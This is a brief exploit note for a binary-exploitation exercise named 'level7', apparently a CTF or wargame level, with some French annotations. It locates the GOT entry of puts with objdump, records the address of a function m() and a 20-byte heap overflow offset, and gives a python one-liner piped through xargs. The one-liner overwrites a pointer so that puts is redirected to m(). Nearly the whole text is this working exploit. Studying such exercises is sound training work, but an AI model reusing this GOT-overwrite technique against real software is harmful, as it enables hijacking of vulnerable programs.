objdump -R ./level7 | grep puts
    08049928 R_386_JUMP_SLOT   puts

adresse GOT de puts = 0x08049928

adresse de m() = 0x080484f4 = \xf4\x84\x04\x08

heap overflow = 20 char

(python -c 'print "A"*20 + "\x28\x99\x04\x08"'; python -c 'print "\xf4\x84\x04\x08"') | xargs ./level7